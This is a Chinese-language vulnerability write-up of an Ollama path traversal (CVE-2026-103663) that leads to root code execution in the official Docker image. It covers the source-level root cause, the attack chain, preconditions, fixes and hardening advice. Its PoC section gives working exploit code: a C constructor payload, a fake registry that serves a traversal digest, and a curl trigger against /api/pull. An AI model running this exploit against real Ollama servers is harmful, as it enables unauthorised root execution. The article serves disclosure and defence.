#  大模型部署工具Ollama目录穿越漏洞，可远程命令执行  
原创 网络安全透视镜
                    网络安全透视镜  网络安全透视镜   2026-10-23 00:28  
  
漏洞复盘 · 通告  
  
2026.10  
  
一个摘要字段引发的任意文件写入  
 ·   
Ollama 路径穿越  
  
  
  
CVE-2026-103663 完整复盘：根因在源码第几行、利用条件有哪些、公开 PoC 怎么跑  
  
  
SECURITY  
  
CVE-2026-103663 · CWE-23 · CVSS 4.0 9.4 · 影响 0.34.2 至 0.35.0  
  
路径穿越  
ROOT RCE  
  
EDITOR'S NOTE  
  
背景与说明  
  
2026 年 10 月 8 日，波兰 CERT（CSIRT NASK）披露了 Ollama 的一个路径穿越漏洞，编号 CVE-2026-103663。漏洞本身不复杂：一个把摘要转成文件名的函数少了一次校验，攻击者就能把文件写到模型目录之外。麻烦的是它的落点——在官方 Docker 镜像里，那正好是程序加载动态库的地方。本文按源码逐行拆解，并给出可复现的完整 PoC。  
  
01  
  
PART  
  
  
漏洞产品描述  
  
PRODUCT DESCRIPTION  
  
Ollama 是一个  
本地大模型推理框架  
，用 Go 写的，主要用于本地部署大模型，安装部署简单，故用户群体庞大。  
  
从网络空间搜索引擎查询到，该产品公网部署的有近百万资产。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/m3tfzlbEQPo8byzc3tb8TVAMXLhG3NKQa7PvgThoTmzTZX4NLQG6DQgUhUXTM6qSSGpEcyrRs7KCKaKYaEah2HLrEkw7ibqPJiby1IZLO8CDY/640?wx_fmt=png&from=appmsg "")  
  
  
项目  
  
内容  
  
受影响产品  
  
Ollama  
  
漏洞编号  
  
CVE-2026-103663 / GHSA-w8p2-phwr-px3r  
  
漏洞类型  
  
相对路径穿越（CWE-23）  
  
受影响版本  
  
0.34.2 至 0.35.0（0.35.0 已修复）  
  
评分  
  
CVSS 4.0 9.4（严重）  
  
攻击前置  
  
能访问 Ollama HTTP API，无需认证，无需任何凭据  
  
披露时间  
  
2026-10-08，报告者 Bartłomiej Dmitruk（striga.ai），经 CERT Polska 协调  
  
公开利用  
  
已有可复现的公开 PoC 与完整利用仓库  
  
02  
  
PART  
  
  
漏洞描述  
  
VULNERABILITY DETAIL  
  
根因：少了一次校验  
  
问题出在   
digestToPath  
 这个函数上。把 manifest 里的 digest（形如   
sha256:abc123  
）转成本地文件名（形如   
sha256-abc123  
），就是把冒号换成连字符。  
  
漏洞版本（0.34.2 到 0.35.0-rc0）的实现是这样的，  
只做了字符替换，没有任何格式校验  
：  
  
.  
.  
.  
go — x/transfer/transfer.go  
  
// digestToPath converts sha256:abc123 to sha256-abc123  
  
func digestToPath(digest string) string {  
  
　if len(digest) > 7 && digest[6] == ':' {  
  
　　return digest[:6] + "-" + digest[7:]  
  
　}  
  
　return digest  
  
}  
  
digest 是从 registry 返回的 manifest 里读出来的，属于  
完全不可信的外部输入  
，但它被直接当成了路径素材。调用方在   
x/transfer/download.go  
 的   
save()  
 函数里：  
  
.  
.  
.  
go — x/transfer/download.go  
  
func (d *downloader) save(ctx context.Context, blob Blob, r io.Reader, existingSize int64) (int64, error) {  
  
　dest := filepath.Join(d.destDir, digestToPath(blob.Digest))  
  
　tmp := dest + ".tmp"  
  
　os.MkdirAll(filepath.Dir(dest), 0o755)  
  
　...  
  
　f, err = os.Create(tmp)  
  
}  
  
filepath.Join  
 会调用   
filepath.Clean  
 对拼接结果做词法清理，而   
Clean  
 只处理字面上的   
..  
 路径段，不会把结果限制在   
destDir  
 里面。  
  
攻击者只要让 digest 里带上   
..  
，拼出来的路径就直接  
跳出 blobs 目录  
，写到服务进程有权限的任何位置。  
  
**值得说清楚的一点是，Ollama 并不是完全没做校验。**  
 走标准下载路径的代码用的是   
manifest.BlobsPath()  
，它内部会先跑一遍正则。  
  
.  
.  
.  
go — manifest/paths.go  
  
var digestPattern = regexp.MustCompile(`^sha256[:-][0-9a-fA-F]{64}$`)  
  
  
func ValidateDigest(digest string) error {  
  
　if !digestPattern.MatchString(digest) {  
  
　　return ErrInvalidDigestFormat  
  
　}  
  
　return nil  
  
}  
  
问题在于   
x/transfer  
 这条路径绕开了   
BlobsPath()  
，直接调   
digestToPath  
。  
两条下载路径并存，只有其中一条带上了校验。  
  
触发路径：只有带 tensor 层的模型会踩到  
  
在   
server/images.go  
 的   
PullModel  
 里有个分支：  
  
.  
.  
.  
go — server/images.go  
  
// Use fast transfer for models with tensor layers (many small blobs)  
  
if hasTensorLayers(layers) {  
  
　if err := pullWithTransfer(ctx, n, layers, manifestData, regOpts, fn); err != nil {  
  
　　return err  
  
　}  
  
　fn(api.ProgressResponse{Status: "success"})  
  
　return nil  
  
}  
  
只有 manifest 里的 layer 带   
application/vnd.ollama.image.tensor  
 这个 mediaType，才会走   
x/transfer  
 这条快速下载通道，从而触发有问题的   
digestToPath  
。普通 GGUF 模型走的是另一条路，那条路有正则校验。  
  
所以触发条件是：  
拉取一个看起来是 safetensors / tensor 格式的模型，并且这个模型来自攻击者能控制的 registry。  
  
一个容易被忽略的细节：为什么落盘的是 .tmp 文件  
  
save() 里写文件时先写   
dest + ".tmp"  
，下载完成后校验哈希，通过了才   
os.Rename  
 成正式文件。正常情况下这个临时文件会被清掉或者改名。  
  
但 download() 的错误处理里有这么一段，  
resumeThreshold 是 64 MB  
：  
  
.  
.  
.  
go — x/transfer/download.go  
  
// Preserve partial .tmp files for large blobs to enable resume  
  
if blob.Size < resumeThreshold {  
  
　dest := filepath.Join(d.destDir, digestToPath(blob.Digest))  
  
　os.Remove(dest + ".tmp")  
  
}  
  
也就是说：  
声明大小小于 64 MB 的 blob，失败后临时文件会被删掉；声明大小大于等于 64 MB 的 blob，失败后临时文件会永久留在磁盘上。  
  
这个行为本来是为了支持大文件的断点续传，但在路径穿越的语境下，它变成了一个关键条件——攻击者需要让下载失败在最后一步，这样恶意内容就以   
.tmp  
 的形式留在了穿越路径上。这也是公开 PoC 里 registry 声称这个 layer 有 64 MiB、实际上只发一个 payload 库就强制断开连接的原因。  
  
顺带一提，临时文件最终不会变成正式文件（哈希对不上），但它确实留在了磁盘上，而且  
内容是攻击者完全控制的  
。  
  
03  
  
PART  
  
  
影响危害  
  
IMPACT  
  
漏洞的直接影响是  
任意文件写  
，攻击者能控制落盘路径和文件内容。危害程度取决于落点能选在哪。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/apNprpz3YS4fZL2JhToWJo2icWMVFLOz7426qBs3QLXQDV5n3Asd9qzwoZfPOMUIDpANLyPzzuwFXxcJxYd9org/640?wx_fmt=jpeg&from=appmsg "")  
  
  
最坏情况：官方 Docker 镜像里的 root 权限执行  
  
这是 CERT Polska 公告里明确点出的那条链。看官方 Dockerfile 的最后阶段：  
  
.  
.  
.  
dockerfile  
  
FROM ubuntu:24.04  
  
...  
  
COPY --from=image-archive /bin /usr/bin  
  
COPY --from=image-archive /lib/ollama /usr/lib/ollama  
  
ENV OLLAMA_HOST=0.0.0.0:11434  
  
EXPOSE 11434  
  
ENTRYPOINT ["/bin/ollama"]  
  
CMD ["serve"]  
  
/usr/lib/ollama 是程序加载动态库的地方，容器以 root 身份运行，服务进程对整个目录有写权限。Ollama 启动时会扫描这个目录寻找 MLX 动态库，加载它找到的   
libmlxc.*  
。源码里这段逻辑在   
mlx/dynamic.go  
：  
  
.  
.  
.  
go — mlx/dynamic.go  
  
// tryLoadFromDir searches a directory for the mlxc shared library and loads it.  
  
func tryLoadFromDir(dir string) bool {  
  
　// On Unix, it's libmlxc.so or libmlxc.dylib  
  
　pattern := "libmlxc.*"  
  
　matches, err := fs.Glob(os.DirFS(dir), pattern)  
  
　...  
  
}  
  
glob 的模式是   
libmlxc.*  
，  
能匹配到 libmlxc.tmp。所以路径穿越写入的临时文件，正好落在这个 glob 的命中范围里。  
  
ATTACK CHAIN  
  
从一次未认证的 HTTP 请求到容器内 root 执行，中间只隔着一个重启  
ATTACKHTTPPULL PATHDIGESTJOINWRITETMPROOTRCE  
攻击者控制 registry 返回带穿越序列的 digest，通过 /api/pull 触发拉取，Ollama 把文件写到 /usr/lib/ollama/mlx_zzz/libmlxc.tmp，容器重启时 MLX loader 扫描目录命中该文件并 dlopen 加载，恶意 so 的构造函数在 root 权限下执行。  
  
完整链条是这样的：  
  
- 攻击者控制或劫持一个 registry，构造一个 layer 的 digest 形如   
sha256:../../../../../../usr/lib/ollama/mlx_zzz/libmlxc.tmp  
  
- 通过 /api/pull 触发拉取，全程无需认证  
  
- Ollama 把 digest 转成路径，跳出 blobs 目录，在目标位置创建 libmlxc.tmp，内容是攻击者的恶意 so  
  
- 攻击者让下载中断（声明 64 MB 却不发完），临时文件留在磁盘上  
  
- 服务重启，MLX loader 扫描目录，glob 命中 libmlxc.tmp 并 dlopen 加载它  
  
- 恶意 so 的构造函数在加载时执行，此时进程是 root  
  
  
  
其他影响面  
  
除了 Docker 场景，路径穿越本身的破坏力也值得单独列一下：  
  
影响  
  
说明  
  
任意文件写  
  
路径和内容都由攻击者控制，写入位置继承服务进程的权限  
  
任意目录创建  
  
os.MkdirAll 无条件执行，可创建任意目录树  
  
文件存在性探测  
  
下载前的 os.Stat 配合穿越路径，可探测服务器上任意文件是否存在及其大小  
  
覆盖应用配置  
  
能写到服务用户可写的配置文件时，可改变应用行为  
  
持久化  
  
写入的文件在服务重启后依然存在，升级补丁不会自动清理  
  
最后一点尤其要注意：  
这个漏洞的利用痕迹会跨越补丁升级而残留。装了 0.35.0 只保证新的拉取不再能被穿越，已经落盘的文件还在原地。  
  
04  
  
PART  
  
  
利用条件  
  
PRECONDITIONS  
  
要真正打成 root 执行，需要同时满足下面几个条件。  
  
01  
   
必备条件  
  
- 目标运行受影响版本，  
0.34.2 到 0.35.0 之间  
（含 0.35.0-rc）  
  
- Ollama HTTP API 可达。默认端口 11434，官方 Docker 镜像里绑定在所有网卡上  
  
- 模型来源可控。digest 来自 registry 返回的 manifest，所以要么攻击者自己架一个 registry，要么劫持篡改已有的 registry 响应  
  
- 目标拉取的 manifest 里含有 tensor mediaType 的 layer，用来把流程导进 x/transfer 路径  
  
  
  
02  
   
把文件写变成代码执行，还需要  
  
- 服务进程对目标目录有写权限。官方 Docker 镜像默认成立，因为容器以 root 运行  
  
- 目标目录会被程序在启动时加载。/usr/lib/ollama 满足这个条件  
  
- 触发一次重启。容器重启、docker restart、进程重启、编排系统滚动更新都算  
  
  
  
03  
   
降低难度的两个便利条件  
  
- 无需认证。Ollama 的 HTTP API 本来就没有认证机制，网络可达即等价于有权限  
  
- 无需受害者交互。CVSS 4.0 里的 UI:P 指的是需要被动用户参与，这里指的是需要有人重启服务，而不是需要有人点链接  
  
  
  
**需要说清楚的是，这个漏洞并不是只要能连上 11434 就能立刻 root。**  
 中间还有 registry 侧控制和重启这两个环节。把它描述成未认证远程 root 是准确的（CERT 给的 9.4 分基于这个前提），但如果目标环境是裸机装 Ollama、模型来自官方 registry、也没有随意重启的习惯，实际可利用性要低不少。  
  
05  
  
PART  
  
  
是否有 PoC / EXP  
  
PROOF OF CONCEPT  
  
有。漏洞研究者 Bartłomiej Dmitruk（striga.ai）在 huntr 上公开了  
完整的技术细节和复现方法  
，官方 PoC 仓库包含六个文件：Bash 编排脚本、Python HTTP registry、C 共享库 payload、Docker Compose 配置、README 和 .gitignore。社区安全数据库已将它标记为 Operational / Verified exploit。  
  
下面是我按公开技术细节整理的最小化复现版本，读者可以在自己授权的测试环境里跑通。整体思路是三样东西：一个能返回恶意 manifest 的假 registry、一个内容是恶意 so 的 payload 文件、以及一次 /api/pull 请求。registry 要做三件事——返回带穿越序列的 layer digest、把该 layer 的 size 声明成 64 MiB、只发 payload 就强制断开连接。  
  
STEP 1  
编译 payload  
  
payload 是一个 so 库，利用 C 的 constructor 属性——它在库被加载时自动执行，不需要任何函数被显式调用。  
  
.  
.  
.  
c — payload.c  
  
[#include]()  
 <stdio.h>  
  
[#include]()  
 <unistd.h>  
  
  
__attribute__((constructor))  
  
void pwn(void) {  
  
　FILE *f = fopen("/tmp/PWNED", "a");  
  
　if (f) {  
  
　　fprintf(f, "uid=%d pid=%d\n", (int)getuid(), (int)getpid());  
  
　　fclose(f);  
  
　}  
  
}  
  
.  
.  
.  
bash  
  
gcc -shared -fPIC -o libmlxc.so payload.c  
  
STEP 2  
起一个假 registry  
  
.  
.  
.  
python — registry.py  
  
import http.server, json, socket, struct  
  
  
PAYLOAD = open("libmlxc.so", "rb").read()  
  
  
# 目录穿越：libmlxc.tmp 会被 MLX loader 的 libmlxc.* glob 命中  
  
EVIL_DIGEST = "sha256:../../../../../../usr/lib/ollama/mlx_zzz/libmlxc.tmp"  
  
  
MANIFEST = {  
  
　"schemaVersion": 2,  
  
　"mediaType": "application/vnd.docker.distribution.manifest.v2+json",  
  
　"config": {  
  
　　"mediaType": "application/vnd.ollama.image.model",  
  
　　"digest": "sha256:" + "0" * 64,  
  
　　"size": 0  
  
　},  
  
　"layers": [{  
  
　　# tensor mediaType，把流程导进 x/transfer 路径  
  
　　"mediaType": "application/vnd.ollama.image.tensor",  
  
　　"digest": EVIL_DIGEST,  
  
　　# 声明大于等于 64MB，失败后 .tmp 不会被清理  
  
　　"size": 67108865  
  
　}]  
  
}  
  
  
class Handler(http.server.BaseHTTPRequestHandler):  
  
　def log_message(self, *a):  
  
　　pass  
  
  
　def do_GET(self):  
  
　　if "/manifests/" in self.path:  
  
　　　body = json.dumps(MANIFEST).encode()  
  
　　　self.send_response(200)  
  
　　　self.send_header("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")  
  
　　　self.send_header("Content-Length", str(len(body)))  
  
　　　self.end_headers()  
  
　　　self.wfile.write(body)  
  
　　　return  
  
  
　　if "/blobs/" in self.path:  
  
　　　# 声明了 64MB，实际只发 payload，然后强制 RST  
  
　　　self.send_response(200)  
  
　　　self.send_header("Content-Type", "application/octet-stream")  
  
　　　self.send_header("Content-Length", str(67108865))  
  
　　　self.end_headers()  
  
　　　self.wfile.write(PAYLOAD)  
  
　　　self.wfile.flush()  
  
　　　# 直接切断连接，让服务端侧下载以错误收场  
  
　　　self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))  
  
　　　self.connection.close()  
  
　　　return  
  
  
　　self.send_response(404)  
  
　　self.end_headers()  
  
  
http.server.HTTPServer(("0.0.0.0", 5000), Handler).serve_forever()  
  
STEP 3  
触发拉取  
  
.  
.  
.  
bash  
  
curl -X POST http://127.0.0.1:11434/api/pull -H "Content-Type: application/json" -d '{"model":"127.0.0.1:5000/evil/model:latest","insecure":true}'  
  
insecure 为 true 是让 Ollama 接受这个明文 HTTP 的自建 registry。  
  
STEP 4  
验证  
  
.  
.  
.  
bash  
  
docker exec ollama ls -la /usr/lib/ollama/mlx_zzz/  
  
docker restart ollama  
  
docker exec ollama cat /tmp/PWNED  
  
预期能看到   
libmlxc.tmp  
，内容就是编译出来的 so；重启后   
/tmp/PWNED  
 里出现 uid 为 0 的记录，就说明构造函数以 root 身份跑起来了。  
  
关于这个 PoC 的说明  
  
- 这套流程需要在你自己的、明确授权的测试环境里跑。目标必须是自己的容器或主机  
  
- payload 这里只做往 /tmp/PWNED 写一行的无害证明，不含反弹 shell，不含外传数据。真要验证危害边界，可以自己替换构造函数里的内容  
  
- registry 是本机自建，不需要真的去劫持任何公共 registry。真实攻击里这一步靠的是控制或篡改 registry 响应  
  
- 清理测试环境时，记得把 libmlxc.tmp 和 /tmp/PWNED 一起删掉。这类文件不会因为升级 Ollama 而自动消失  
  
  
  
06  
  
PART  
  
  
修复建议  
  
REMEDIATION  
  
官方修复  
  
Ollama 0.35.0 修复了这个问题。修复方式不是改   
digestToPath  
（这个函数在 0.35.0 里依然是原来的样子），而是在 transfer 包的入口处补上了统一校验。  
  
.  
.  
.  
go — transfer/transfer.go  
  
func validateBlobs(blobs []Blob) error {  
  
　for _, blob := range blobs {  
  
　　if err := manifest.ValidateDigest(blob.Digest); err != nil {  
  
　　　return fmt.Errorf("blob %q: %w", blob.Digest, err)  
  
　　}  
  
　}  
  
　return nil  
  
}  
  
  
func Download(ctx context.Context, opts DownloadOptions) error {  
  
　if err := validateBlobs(opts.Blobs); err != nil {  
  
　　return err  
  
　}  
  
　...  
  
}  
  
这样所有进入 transfer 下载路径的 digest 都会先过一遍正则白名单，含   
..  
 的非法 digest 在发起任何网络请求之前就被拒掉了。  
  
我核对了 v0.34.4 和 v0.35.0-rc0 的 transfer 包，这两个版本里都还没有   
validateBlobs  
，也没有调用   
ValidateDigest  
。0.35.0 是第一个带上的版本。顺带一提，transfer 包在这两个版本之间还从   
x/transfer/  
 挪到了   
transfer/  
，这是重构，不是漏洞相关。  
  
给运维的具体动作  
  
01  
   
必须做的  
  
- 升级到 0.35.0 或更高版本。Docker 部署建议锁定 tag 而不是用 latest  
  
- 升级后重建容器镜像，不要只替换运行中的二进制。已经落盘的文件不会随升级消失  
  
- 检查目标目录有没有不该存在的文件，重点是 /usr/lib/ollama 及其子目录、模型仓库目录，找 .tmp 结尾的异常文件和 libmlxc.*  
  
- 轮换服务进程能读到的凭据。容器内通常有环境变量里的 token，模型仓库里也可能有 API key  
  
  
  
02  
   
强烈建议做的  
  
- 端口绑定到回环地址，别绑 0.0.0.0。Docker 里用   
-p 127.0.0.1:11434:11434  
 发布端口  
  
- 需要远程访问就在前面加一层带认证的反向代理，或者走 VPN  
  
- 把 /usr/lib/ollama 挂成只读。容器加 --read-only 配合独立可写卷给模型目录，这样即使路径穿越成立，也写不到加载代码的目录  
  
- 服务进程降权运行，不要用 root。任意文件写的能力配上 root 权限才是完整的 RCE  
  
- 只从自己信任的 registry 拉模型  
  
  
  
关于云主机的额外提醒  
  
同一时期 Ollama 的   
/api/pull  
 路径上还有两个 SSRF 漏洞（CVE-2026-108836、CVE-2026-85180），都能让服务端向内网发起请求。在云主机上要额外确认  
实例元数据服务  
（AWS 的 IMDSv2 等）的访问控制，否则路径穿越和 SSRF 可以组合出更完整的信息泄露链。  
  
07  
  
PART  
  
  
写在最后  
  
FINAL NOTES  
  
这个漏洞的成因不复杂，甚至可以说朴素——一个本该是纯十六进制的哈希字符串，被当成了路径素材直接拼进   
filepath.Join  
。真正的教训在于位置：这个功能位于  
模型分发  
这条链路上，而模型分发本质上就是软件分发。  
  
Ollama 之前有过一次同类问题。2024 年的 CVE-2024-37032（代号 Probllama）就是同一个套路：下载 blob 时没有校验 digest 格式，用   
filepath.Join  
 拼路径后   
os.Create  
 写入，穿越直接逃逸出 blobs 目录。那次的利用方式是写 /etc/ld.so.preload。六年后，同一类缺陷在新的下载实现里又出现了一次。  
  
两次的差别在于校验的位置。标准下载路径一直有正则把关，新加的快速下载通道绕开了它。修复也一样——不是让每个调用点都小心，而是  
把校验收到统一的入口上去  
。  
  
ONE LINE TO REMEMBER  
  
升级到 0.35.0 之后，还要去 /usr/lib/ollama 看看有没有多出来的文件。补丁堵住的是入口，不是已经落在磁盘上的东西。  
  
参考资料  
  
01 / CERT Polska 官方公告：cert.pl/en/posts/2026/10/CVE-2026-103663/  
  
02 / GitHub Security Advisory：github.com/advisories/GHSA-w8p2-phwr-px3r  
  
03 / NVD 条目：nvd.nist.gov/vuln/detail/CVE-2026-103663  
  
04 / Ollama 源码：x/transfer/transfer.go、x/transfer/download.go、manifest/paths.go、server/images.go、mlx/dynamic.go  
  
05 / 报告者公开的复现材料：huntr bounty 3af6bcc9-4c40-4cb5-83c6-d33b3a40e8e0  
  
我是网络安全透视镜  
  
如果你觉得今天这篇有收获，欢迎点赞、在看、转发三连，我们下篇见  
  
赞  
  
  
在看  
  
  
收藏  
  
THANKS FOR READING  
  
  
